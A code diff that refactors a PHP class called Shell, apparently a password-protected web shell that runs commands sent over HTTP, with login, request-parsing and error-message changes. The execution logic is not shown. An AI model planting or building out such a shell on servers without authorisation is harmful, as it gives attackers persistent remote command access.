@@ -61,8 +61,8 @@ class Shell {
     public function login($username = '', $password = '')
     {
         return (bool) (
-            sha1($username) == $this->config['username']
-            && sha1($password) == $this->config['password']
+            sha1($username) === $this->config['username']
+            && sha1($password) === $this->config['password']
         );
     }
 
@@ -70,26 +70,24 @@ class Shell {
     {
         return (bool) (
             isset($_SERVER['HTTP_X_REQUESTED_WITH'])
-            && $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest'
+            && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest'
         );
     }
 
     private function request($input = '')
     {
-        switch ($_SERVER['REQUEST_METHOD']) {
-            case 'POST':
-                $data = $_POST;
-                break;
-            case 'GET':
-                $data = $_GET;
-                break;
-            default:
-                $data = array();
-                break;
-        }
+        if (array_key_exists('REQUEST_METHOD', $_SERVER)) {
+            $data = array();
 
-        if (array_key_exists($input, $data)) {
-            return $data[$input];
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                $data = $_POST;
+            } elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
+                $data = $_GET;
+            }
+
+            if (array_key_exists($input, $data)) {
+                return $data[$input];
+            }
         }
 
         return false;
@@ -153,7 +151,7 @@ class Shell {
                 $disabled_functions = $this->disabledFunctions();
 
                 return sprintf(
-                    'These functions are disabled throught php.ini: %s',
+                    'Disabled native functions: %s',
                     implode(",\x20", $disabled_functions)
                 );
             } elseif (preg_match('/^(get_php_version|php_version)$/', $command)) {
@@ -208,7 +206,7 @@ class Shell {
                     }
 
                     if ($output == null) {
-                        $output = sprintf("Cannot execute this command: %s\n", $command);
+                        $output = sprintf("Cannot execute this command: %s", $command);
                     }
                 }
 
